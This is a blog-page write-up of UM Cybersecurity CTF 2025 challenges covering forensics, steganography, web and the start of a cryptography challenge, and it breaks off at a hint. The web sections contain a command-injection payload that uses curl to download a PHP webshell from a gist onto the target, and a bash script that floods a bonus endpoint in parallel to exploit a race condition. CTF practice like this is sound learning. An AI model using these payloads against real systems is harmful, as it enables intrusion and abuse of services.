<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="A writeup collection for UM Cybersecurity CTF 2025."><title>UMCTF-Writeup</title><link rel=canonical href=https://xph0816.github.io/p/umcsctf-writeup/><link rel=stylesheet href=/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css><meta property="og:title" content="UMCTF-Writeup"><meta property="og:description" content="A writeup collection for UM Cybersecurity CTF 2025."><meta property="og:url" content="https://xph0816.github.io/p/umcsctf-writeup/"><meta property="og:site_name" content="Song's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="CTF"><meta property="article:tag" content="CTF Writeup"><meta property="article:tag" content="UMCTF"><meta property="article:published_time" content="2025-04-14T00:00:00+08:00"><meta property="article:modified_time" content="2025-04-14T00:00:00+08:00"><meta property="og:image" content="https://xph0816.github.io/p/umcsctf-writeup/feature-umcs-ctf-2025.png"><meta name=twitter:title content="UMCTF-Writeup"><meta name=twitter:description content="A writeup collection for UM Cybersecurity CTF 2025."><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://xph0816.github.io/p/umcsctf-writeup/feature-umcs-ctf-2025.png"><link rel="shortcut icon" href=/favicon.svg></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hu12ef359483bc258b4d0472d73331359c_69166_300x0_resize_q75_box.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a>
<span class=emoji>📖</span></figure><div class=site-meta><h1 class=site-name><a href=/>Song's Blog</a></h1><h2 class=site-description>Studying</h2></div></header><ol class=social-menu><li><a href=https://github.com/XPH0816 target=_blank title=GitHub rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://www.linkedin.com/in/lss0816/ target=_blank title=Linkedin rel=me><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#2c3e50" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="4" y="4" width="16" height="16" rx="2"/><line x1="8" y1="11" x2="8" y2="16"/><line x1="8" y1="8" x2="8" y2="8.01"/><line x1="12" y1="16" x2="12" y2="11"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></a></li><li><a href=/img/qrcode.png target=_blank title=WeChat rel=me><!doctype html><svg t="1676174392026" class="icon" viewBox="0 0 1194 1024" xmlns="http://www.w3.org/2000/svg" p-id="2999" xmlns:xlink="http://www.w3.org/1999/xlink" width="233.203125" height="200"><path d="M728.064 535.296a35.498667 35.498667.0 11-70.912.0 35.498667 35.498667.0 0170.912.0m246.016.0a35.498667 35.498667.0 11-70.997333.0 35.498667 35.498667.0 0170.997333.0" fill="#cdcdcd" p-id="3e3"/><path d="M902.144 930.133333l-6.656 1.450667a594.176 594.176.0 01-18.602667 3.669333c-26.453333 4.778667-44.629333 6.826667-64 6.144C645.034666 935.850666 514.218666 853.504 461.824 722.688a446.464 446.464.0 01-6.826667-19.114667l-1.962666-6.058666a199.68 199.68.0 01-3.84-13.653334 338.858667 338.858667.0 01-9.216-75.690666c0-171.008 157.013333-305.92 354.304-314.709334l8.874666-.682666c7.850667-.597333 12.970667-.853333 18.773334-.853334h14.762666l9.301334.170667c188.16 14.677333 340.394667 156.672 340.394666 323.925333.0 78.336-38.826667 155.733333-109.653333 222.293334a303.530667 303.530667.0 01-7.082667 6.4l9.984 71.082666a49.152 49.152.0 01-69.12 58.453334l-98.816-46.421334a582.485333 582.485333.0 01-9.472 2.304zm220.16-314.026666c0-131.754667-124.586667-247.978667-279.125333-260.096H821.930667c-3.754667.0-7.68.085333-13.994667.597333l-10.666667.768C631.466667 364.8 503.978667 474.453333 503.978667 608.256c0 18.773333 2.730667 40.874667 7.509333 60.842667.597333 2.474667 1.450667 5.632 2.56 9.216l1.706667 4.949333c2.133333 6.570667 4.266667 12.629333 5.632 15.957333 42.325333 105.728 149.930667 173.397333 293.717333 178.176 13.738667.512 28.16-1.109333 50.346667-5.12a531.626667 531.626667.0 0016.64-3.242666l5.632-1.28c4.693333-1.109333 8.448-1.962667 19.370666-4.778667a32 32 0 0121.418667 2.133333L1013.76 905.216l-9.984-69.290667a32 32 0 0113.909333-31.232c1.194667-.853333 8.618667-6.912 15.189334-13.056 58.709333-55.210667 89.429333-116.394667 89.429333-175.616zM12.970667 378.197333C12.970667 171.52 206.677333 5.376 442.709333 5.376c208.384.0 394.24 130.304 431.872 306.090667 1.28 5.973333 1.28 11.264.512 16.896a32 32 0 01-63.658666-5.973334C779.178667 179.2 621.482667 69.376 442.709333 69.376c-202.666666.0-365.738666 139.776-365.738666 308.906667.0 89.941333 46.165333 171.52 136.021333 237.568a32 32 0 0111.434667 35.84l-23.296 69.973333 104.96-48.896a32 32 0 0122.442666-1.706667l5.461334 1.706667c54.357333 11.093333 76.288 14.506667 108.714666 14.506667a200.789333 200.789333.0 0032.256-4.010667c-.512.170667-1.536.512-2.730666 1.536a33.109333 33.109333.0 0139.253333 1.109333A32 32 0 01516.864 730.88c-11.776 14.848-47.36 20.309333-74.24 20.309333-37.12.0-62.037333-3.584-119.893333-15.530666L198.570667 793.6a49.493333 49.493333.0 01-68.949334-59.733333l26.88-80.64c-93.525333-75.52-143.530666-170.24-143.530666-275.029334z" fill="#cdcdcd" p-id="3001"/><path d="M344.576 254.378667a44.373333 44.373333.0 11-88.746667.085333 44.373333 44.373333.0 0188.746667.0M636.586667 254.378667A44.373333 44.373333.0 11547.84 254.464a44.373333 44.373333.0 0188.746667.0" fill="#cdcdcd" p-id="3002"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>Home</span></a></li><li><a href=/archives/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>Archives</span></a></li><li><a href=/search/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>Search</span></a></li><li><a href=/projects/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-stars" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M17.8 19.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L17.8 19.817z"/><path d="M6.2 19.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L6.2 19.817z"/><path d="M12 9.817l-2.172 1.138a.392.392.0 01-.568-.41l.415-2.411-1.757-1.707a.389.389.0 01.217-.665l2.428-.352 1.086-2.193a.392.392.0 01.702.0l1.086 2.193 2.428.352a.39.39.0 01.217.665l-1.757 1.707.414 2.41a.39.39.0 01-.567.411L12 9.817z"/></svg><span>Projects</span></a></li><div class=menu-bottom-section><li id=i18n-switch><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 5h7"/><path d="M9 3v2c0 4.418-2.239 8-5 8"/><path d="M5 9c-.003 2.144 2.952 3.908 6.7 4"/><path d="M12 20l4-9 4 9"/><path d="M19.1 18h-6.2"/></svg><select name=language onchange="window.location.href=this.selectedOptions[0].value"><option value=https://xph0816.github.io/ selected>English</option><option value=https://xph0816.github.io/zhcn/>简体中文</option></select></li><li id=dark-mode-toggle><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg><span>Dark Mode</span></li></div></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#forensic-hidden-in-plain-graphic><strong>Forensic: Hidden in Plain Graphic</strong></a></li><li><a href=#steganography-broken><strong>Steganography: Broken</strong></a></li><li><a href=#steganography-hotline-miami><strong>Steganography: Hotline Miami</strong></a></li><li><a href=#web-healthcheck><strong>Web: Healthcheck</strong></a></li><li><a href=#web-straightforward><strong>Web: Straightforward</strong></a></li><li><a href=#cryptography-gist-of-samuel><strong>Cryptography: Gist of Samuel</strong></a></li><li><a href=#pwn-babysc><strong>PWN: Babysc</strong></a></li><li><a href=#pwn-liveleak><strong>PWN: Liveleak</strong></a></li></ol><ol><li><a href=#web-microservices-solve-after-preliminary-round-end><strong>Web: Microservices （SOLVE AFTER PRELIMINARY ROUND END）</strong></a></li></ol></nav></div></section></aside><main class="main full-width"><article class="has-image main-article"><header class=article-header><div class=article-image><a href=/p/umcsctf-writeup/><img src=/p/umcsctf-writeup/feature-umcs-ctf-2025_hu29242262a73c9ee95f0d5de12fe6bdef_702289_800x0_resize_box_3.png srcset="/p/umcsctf-writeup/feature-umcs-ctf-2025_hu29242262a73c9ee95f0d5de12fe6bdef_702289_800x0_resize_box_3.png 800w, /p/umcsctf-writeup/feature-umcs-ctf-2025_hu29242262a73c9ee95f0d5de12fe6bdef_702289_1600x0_resize_box_3.png 1600w" width=800 height=371 loading=lazy alt="Featured image of post UMCTF-Writeup"></a></div><div class=article-details><header class=article-category><a href=/categories/ctf-writeup/ style=background-color:#2a9d8f;color:#fff>CTF Writeup</a>
<a href=/categories/umctf-2025/ style=background-color:#2a9d8f;color:#fff>UMCSCTF 2025</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/umcsctf-writeup/>UMCTF-Writeup</a></h2><h3 class=article-subtitle>A writeup collection for UM Cybersecurity CTF 2025.</h3></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>Apr 14, 2025</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>10 minute read</time></div></footer></div></header><section class=article-content><h1 id=group--dgng><strong>Group : $+€@d¥G@Ng</strong></h1><h2 id=forensic-hidden-in-plain-graphic><strong>Forensic: Hidden in Plain Graphic</strong></h2><p>First, I open the PCAP file with Wireshark and while scanning through the traffic, I notice a tcp packet which seems to be suspicious because of the large length of it.<br>Thus, I clicked on it to check and noticed that there’s magic bytes of PNG file. Then, I tried to extract the hex and convert it into PNG and here’s the PNG file extracted.</p><p><img src=/p/umcsctf-writeup/image1.png width=249 height=249 srcset="/p/umcsctf-writeup/image1_hucc08bb1441f3436969b9a7e3c0719bf1_9679_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image1_hucc08bb1441f3436969b9a7e3c0719bf1_9679_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=100 data-flex-basis=240px></p><p>I tried to decode the PNG file with online tools first to save time and luckily it works.<br>Online tool: <a class=link href=https://www.aperisolve.com/12dc4632c2fb6cd620988d3349e9639d target=_blank rel=noopener>https://www.aperisolve.com/12dc4632c2fb6cd620988d3349e9639d</a><br>The flag found at the Zsteg part:</p><h2 id=steganography-broken><strong>Steganography: Broken</strong></h2><p>Since the mp4 is broken, I try to fix it using an online tool first, and it works. After repair with an online tool, the flag is shown in the video.<br>Online tool: <a class=link href=https://repair.easeus.com/ target=_blank rel=noopener>https://repair.easeus.com/</a></p><p><img src=/p/umcsctf-writeup/image2.png width=302 height=101 srcset="/p/umcsctf-writeup/image2_hu6b0d1b39e4718133db1b4751dac4bd20_12451_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image2_hu6b0d1b39e4718133db1b4751dac4bd20_12451_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=299 data-flex-basis=717px></p><h2 id=steganography-hotline-miami><strong>Steganography: Hotline Miami</strong></h2><p><a class=link href=https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami target=_blank rel=noopener>https://github.com/umcybersec/umcs_preliminary/tree/main/stego-Hotline_Miami</a></p><p><strong><img src=/p/umcsctf-writeup/image3.png width=940 height=276 srcset="/p/umcsctf-writeup/image3_hu9ef0efe2bfe2d5e12d9b3fc987f748ed_92568_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image3_hu9ef0efe2bfe2d5e12d9b3fc987f748ed_92568_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=340 data-flex-basis=817px></strong></p><p>Given three files from this question, I saw that in <a class=link href=https://raw.githubusercontent.com/umcybersec/umcs_preliminary/refs/heads/main/stego-Hotline_Miami/readme.txt target=_blank rel=noopener>readme.txt</a> is given the flag format.<br><img src=/p/umcsctf-writeup/image4.png width=237 height=31 srcset="/p/umcsctf-writeup/image4_hu5f7064ff726aa02f2b2e9943da6f3a3e_1215_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image4_hu5f7064ff726aa02f2b2e9943da6f3a3e_1215_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=764 data-flex-basis=1834px><br>Next, I found that the wav file must be hidden, so I opened the “Sonic Visualizer” and added a layer for the spectrogram with all channels mixed. I found that the information or keyword is hidden in the wav file shown on the figure below.<br><img src=/p/umcsctf-writeup/image5.png width=602 height=343 srcset="/p/umcsctf-writeup/image5_hua0d72abb7548f45e948ca0fcce0bc9f0_206038_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image5_hua0d72abb7548f45e948ca0fcce0bc9f0_206038_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=175 data-flex-basis=421px></p><p>So the verb will be “WATCHING” and the year will be “1989”. Then I go to use an online tool to see the information from the <a class=link href=https://github.com/umcybersec/umcs_preliminary/blob/main/stego-Hotline_Miami/rooster.jpg target=_blank rel=noopener>png file</a>. <a class=link href=https://www.aperisolve.com/81954be3cdc998e92aeab90a8a228a18 target=_blank rel=noopener>https://www.aperisolve.com/81954be3cdc998e92aeab90a8a228a18</a></p><p>Notice that the end of the file contains a name called RICHARD.<br><img src=/p/umcsctf-writeup/image6.png width=940 height=426 srcset="/p/umcsctf-writeup/image6_hu4c50052777ed52f3d33127d971a0d7f2_167997_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image6_hu4c50052777ed52f3d33127d971a0d7f2_167997_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=220 data-flex-basis=529px></p><p>Lastly, I guess the word for the “Be” which I put straight forward is “IS”. I try to submit it then boom successfully get the flag.</p><p><strong>Flag: umcs{RICHARD_IS_WATCHING_1989}</strong></p><h2 id=web-healthcheck><strong>Web: Healthcheck</strong></h2><p><a class=link href=https://github.com/umcybersec/umcs_preliminary/tree/main/web-healthcheck target=_blank rel=noopener>https://github.com/umcybersec/umcs_preliminary/tree/main/web-healthcheck</a></p><p><img src=/p/umcsctf-writeup/image7.png width=940 height=369 srcset="/p/umcsctf-writeup/image7_huf83dc4a99e84a6e1c99110b6cda5c452_91882_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image7_huf83dc4a99e84a6e1c99110b6cda5c452_91882_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=254 data-flex-basis=611px><br>First of all, I reviewed the source code and found that the source code does some good practice in secure coding but it is not secure enough because of using <code>shell_exec()</code> function which is vulnerable to Remote Code Execution (RCE). So I input the <code>curl https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php -o shell.php</code> command to download the <a class=link href=https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/c871f130a12e97090a08d0ab855c1b7a93ef1150/easy-simple-php-webshell.php target=_blank rel=noopener>shell script</a> given from online. After that, I browse the shell script page and <code>cat</code> the flag content.<br><img src=/p/umcsctf-writeup/image8.png width=940 height=93 srcset="/p/umcsctf-writeup/image8_hu90fb8c50401b65f28ce34c9aed897e55_13675_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image8_hu90fb8c50401b65f28ce34c9aed897e55_13675_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=1010 data-flex-basis=2425px>
Tadaa, the flag shown from the figure above.</p><p>Flag: umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}</p><h2 id=web-straightforward><strong>Web: Straightforward</strong></h2><p><strong><img src=/p/umcsctf-writeup/image9.png width=753 height=730 srcset="/p/umcsctf-writeup/image9_hu36e2abefc5fd83a1518bd0bcc335165e_110664_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image9_hu36e2abefc5fd83a1518bd0bcc335165e_110664_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=103 data-flex-basis=247px></strong>
<strong><img src=/p/umcsctf-writeup/image10.png width=940 height=351 srcset="/p/umcsctf-writeup/image10_huec6d8175dac65ec09b3f4a25019d8acf_28923_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image10_huec6d8175dac65ec09b3f4a25019d8acf_28923_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=267 data-flex-basis=642px></strong></p><p>On this challenge I downloaded the zip provided file and checked on app.py code to get the overview of how the logical works.There was a reveal of few endpoints such as POST /register to creates a new user, POST /claim to claims a daily reward, GET /dashboard to shows current balance, POST /buy_flag to attempts to redeem the flag. From inspecting there I came to understand that the website each user can claim a daily bonus and claiming multiple bonus is the bug. So, I created a bash script using <em><strong>curl</strong></em> and <em><strong>xargs</strong></em> to register as a new user, then started to spam /claim points with many requests before the backend checks and prevents duplicate claims. At first I managed to increase the balance with the script but looking back at its logic , I understand that SET balance = balance - 3000 WHERE username =? , it requires to minus 3000 from the existing balance then only it would return with flag.html. So updated the script as below to capture the flag.</p><p><img src=/p/umcsctf-writeup/image11.png width=940 height=333 srcset="/p/umcsctf-writeup/image11_hu9a43b6d14733b0aa90e8326449ae4f32_115255_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image11_hu9a43b6d14733b0aa90e8326449ae4f32_115255_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=282 data-flex-basis=677px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=se>\#\!</span>/bin/bash  
</span></span><span class=line><span class=cl><span class=nv>USER</span><span class=o>=</span><span class=s2>&#34;ctfuser</span><span class=nv>$RANDOM</span><span class=s2>&#34;</span>  
</span></span><span class=line><span class=cl>COOKIE<span class=se>\_</span>FILE<span class=o>=</span><span class=s2>&#34;cookies.txt&#34;</span>  
</span></span><span class=line><span class=cl>BASE<span class=se>\_</span>URL<span class=o>=</span><span class=s2>&#34;http://159.69.219.192:7859&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Registering user: </span><span class=nv>$USER</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>curl <span class=se>\-</span>s <span class=se>\-</span>c <span class=s2>&#34;</span><span class=nv>$COOKIE</span><span class=s2>\_FILE&#34;</span> <span class=se>\-</span>X POST <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>\_URL/register&#34;</span> <span class=se>\\</span>  
</span></span><span class=line><span class=cl>     <span class=se>\-</span>d <span class=s2>&#34;username=</span><span class=nv>$USER</span><span class=s2>&#34;</span> <span class=se>\&gt;</span> /dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=se>\[</span> <span class=nv>$?</span> <span class=se>\-</span>ne <span class=m>0</span> <span class=se>\]</span><span class=p>;</span> <span class=k>then</span>  
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Registration failed&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=nb>exit</span> <span class=m>1</span>  
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Claiming daily bonus multiple times in parallel...&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>seq <span class=m>1</span> <span class=m>20</span> <span class=p>|</span> xargs <span class=se>\-</span>P20 <span class=se>\-</span>I<span class=o>{}</span> curl <span class=se>\-</span>s <span class=se>\-</span>b <span class=s2>&#34;</span><span class=nv>$COOKIE</span><span class=s2>\_FILE&#34;</span> <span class=se>\-</span>X POST <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>\_URL/claim&#34;</span> <span class=se>\&gt;</span> /dev/null
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Waiting for DB writes to finish...&#34;</span>  
</span></span><span class=line><span class=cl>sleep <span class=m>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Checking balance...&#34;</span>  
</span></span><span class=line><span class=cl><span class=nv>BALANCE</span><span class=o>=</span><span class=k>$(</span>curl <span class=se>\-</span>s <span class=se>\-</span>b <span class=s2>&#34;</span><span class=nv>$COOKIE</span><span class=s2>\_FILE&#34;</span> <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>\_URL/dashboard&#34;</span> <span class=p>|</span> grep <span class=se>\-</span>oP <span class=s1>&#39;\\d{4,}&#39;</span><span class=k>)</span>  
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Current balance: </span><span class=nv>$BALANCE</span><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;\[\*\] Attempting to redeem flag...&#34;</span>  
</span></span><span class=line><span class=cl><span class=nv>RESPONSE</span><span class=o>=</span><span class=k>$(</span>curl <span class=se>\-</span>s <span class=se>\-</span>b <span class=s2>&#34;</span><span class=nv>$COOKIE</span><span class=s2>\_FILE&#34;</span> <span class=se>\-</span>X POST <span class=s2>&#34;</span><span class=nv>$BASE</span><span class=s2>\_URL/buy\_flag&#34;</span><span class=k>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=se>\#</span> Detect UMCS-style flags  
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$RESPONSE</span><span class=s2>&#34;</span> <span class=p>|</span> grep <span class=se>\-</span>iq <span class=s2>&#34;UMCS&#34;</span><span class=p>;</span> <span class=k>then</span>  
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Flag found\!&#34;</span>  
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;</span><span class=nv>$RESPONSE</span><span class=s2>&#34;</span> <span class=p>|</span> grep <span class=se>\-</span>oE <span class=s1>&#39;UMCS\\{.\*?\\}&#39;</span>  
</span></span><span class=line><span class=cl><span class=k>else</span>  
</span></span><span class=line><span class=cl>    <span class=nb>echo</span> <span class=s2>&#34;Flag not found. Current balance insufficient.&#34;</span>  
</span></span><span class=line><span class=cl><span class=k>fi</span>
</span></span></code></pre></td></tr></table></div></div><p>Upon running through the bash script flag was found. So basically, the vulnerability over this challenge lacks concurrency control as multiple requests simultaneously sent to /claim. Each request checks if the user already claimed a bonus but before the server can update the state &ldquo;use&rdquo;, other requests enter in,making receiving more bonus than intended. I came to understand that this is a TOCTOU vulnerability which is a time of check and time of use vulnerability. To prevent this kind of vulnerability,lock the database row or use transactions to avoid simultaneous writes,track requests per session and apply strict rate limiting,implement server-side timestamp checks for bonus claims</p><p><strong>Flag: umcs{th3_s0lut10n_1s_pr3tty_str41ghtf0rw4rd_too!}</strong></p><h2 id=cryptography-gist-of-samuel><strong>Cryptography: Gist of Samuel</strong></h2><p><img src=/p/umcsctf-writeup/image12.png width=449 height=439 srcset="/p/umcsctf-writeup/image12_hu554ed60667f5cd11f94175da7b2e8a94_46991_480x0_resize_box_3.png 480w, /p/umcsctf-writeup/image12_hu554ed60667f5cd11f94175da7b2e8a94_46991_1024x0_resize_box_3.png 1024w" loading=lazy class=gallery-image data-flex-grow=102 data-flex-basis=245px></p><p>Hint: 